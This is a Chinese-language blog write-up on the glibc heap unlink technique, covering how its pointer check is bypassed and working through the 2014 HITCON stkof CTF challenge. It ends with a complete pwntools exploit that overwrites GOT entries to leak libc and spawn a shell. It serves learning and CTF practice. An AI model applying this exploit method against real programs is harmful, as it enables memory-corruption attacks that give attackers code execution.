---
title: unlink漏洞学习
date: 2021-04-15 21:45:07
tags: 
     - PWN学习 
categories:
     - PWN学习 
     - 学习
---

# 堆的unlink漏洞学习

## 前言

做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT

## Unlink基本原理

Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下

<img src="unlink.png" alt="unlink基本原理" style="zoom:67%;" />

目的是为了把图中的P拿出来，然后使FD->bk=BK 以及BK->fd=FD，其实这里说的也已经很清楚[CTF wiki unlink](https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2)，不过我就是不明白unlink的一个检查机制

双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink

块。当攻击者使用 free -12 和 shellcode 地址覆

盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块

（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。

```c++
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
malloc_printerr (check_action, "corrupted double-linked
list", P); 
```

以及这个机制的绕过，这个机制主要是验证p-> fd-> bk == p 和 p-> bk-> fd == p

绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2\*偏移

这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）

不过做了一道题后理解就很清楚了，果然不能光看。

## 2014 HITCON stkof

程序开启了canary和堆栈不可执行保护

<img src="image-20210415213154332.png" alt="检查" style="zoom:67%;" />                       

程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能

<img src="image-20210415213239564.png" alt="运行" style="zoom:67%;" />

输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中

 <img src="image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;" />

输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容

 <img src="image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;" />

输入3是进行free的操作

 <img src="image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;" />

**注意这里所有操作都是通过全局变量指针s来进行的**

### 利用思路

1. 首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10

2. 在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。

3. 这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。

4. 编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址

5. 最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用

### 攻击过程

首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。

 <img src="image-20210415213459651.png" alt="创建堆快" style="zoom:67%;" />

查看全局变量s的位置，4个堆块的指针都记录在上面

 <img src="image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;" />

然后修改chunk2伪造堆块

 <img src="image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;" />

0是伪造堆块的prev_size，0x30是size 

0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置

0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置

然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态

进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断

p-> fd-> bk = = p 和 p-> bk-> fd ==p，这里p-> fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=>0x2846460=p，验证通过，然后p-> bk-> fd ==p的过程同上。

然后进行unlink操作

```c++
FD = p->fd;
BK = p->bk;
FD->bk = BK;
BK->fd = FD;
```

这里FD->bk和BK->fd都是chunk2在全局变量指针中的地址，最后会进行BK->fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下

 <img src="image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;" />

可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）

然后进行修改chunk2的操作（先从全局变量取指针0x602150->0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）

 <img src="image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;" />

这里0x602148和0x602150已经被修改为free_got和put_plt

然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址

进行free（2）的操作，实际上是put出put_plt泄露出真实地址

 <img src="image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;" />

后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。

脚本如下，参考了https://bbs.pediy.com/thread-247007.htm

```python
#!usr/bin/env python
# -*- coding:utf-8 -*-
 
from pwn import*
 
context(log_level = "debug",os = "linux")

p = process("./stkof")
 
def malloc(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil("OK\n")
 
def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
 
def edit(idx,strings):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(strings)))
    p.send(strings)
    p.recvuntil("OK\n")
 
malloc(0x20)
malloc(0x30)
malloc(0x80)
malloc(0x20)
#创建4个堆快，第三个用来free的堆快不能是fastbin

target = 0x602140 + 0x10
fd = target - 0x18
bk = target - 0x10

payload = p64(0) #伪造堆块的prev_size
payload += p64(0x30) #伪造堆块的size
payload += p64(fd) + p64(bk)
payload += "a"*0x10
payload += p64(0x30) + p64(0x90)  #更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink
edit(2,payload)

free(3)
p.recvuntil("OK\n")

elf = ELF("./stkof")
libc = ELF("./libc.so.6")
 
free_got = elf.got["free"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
payload2 = "a"*0x10 
payload2 += p64(free_got) + p64(puts_got)
edit(2,payload2)

payload3 = p64(puts_plt)
edit(1,payload3)
#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 
free(2)
puts_addr = u64(p.recvuntil("\nOK\n",drop = True).ljust(8,'\x00'))

#gdb.attach(p)
puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
binp_offset = libc.search('/bin/sh').next()
 
libc_base = puts_addr - puts_offset
 
system_addr = libc_base + system_offset
 
payload4 = p64(system_addr)

edit(1,payload4)
#再次修改chunk1，把free_got修改为system的地址

edit(4,"/bin/sh\00")
free(4)
 
p.interactive()

```

